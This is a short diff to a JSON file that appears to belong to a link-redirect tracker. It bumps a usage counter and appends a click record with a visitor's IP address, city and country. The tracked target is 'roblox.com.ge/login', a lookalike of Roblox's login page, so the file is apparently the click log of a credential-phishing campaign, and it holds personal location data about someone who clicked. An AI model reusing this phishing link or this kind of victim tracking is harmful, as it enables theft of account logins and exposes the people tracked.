@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1479,
+    "useCount": 1480,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12000,6 +12000,14 @@
         "city": "Yangon",
         "flag": "🇲🇲",
         "countryCode": "MM"
+      },
+      {
+        "timestamp": 1777438735959,
+        "ip": "189.217.89.58",
+        "country": "Mexico",
+        "city": "Benito Juarez",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
